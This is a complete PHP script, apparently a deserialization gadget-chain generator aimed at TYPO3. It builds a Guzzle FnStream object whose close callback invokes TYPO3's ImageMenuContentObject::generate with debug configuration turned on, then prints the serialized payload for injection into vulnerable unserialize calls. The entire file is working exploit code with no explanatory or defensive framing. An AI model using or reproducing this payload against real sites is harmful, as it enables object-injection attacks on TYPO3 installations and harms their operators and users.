<?php
namespace TYPO3\CMS\Frontend\ContentObject\Menu {
    class ImageMenuContentObject {
        public $menuArr = [];
        public $mconf = ['debugItemConf' => true];
    }
}
namespace GuzzleHttp\Psr7 {
    class FnStream {
        /**
         * @var array
         */
        public $_fn_close;
        public function __construct($callback)
        {
            $this->_fn_close = $callback;
        }

    }
}
namespace {
    $payload = new \GuzzleHttp\Psr7\FnStream([
        new \TYPO3\CMS\Frontend\ContentObject\Menu\ImageMenuContentObject(),
        'generate'
    ]);
    var_dump(serialize($payload));
}
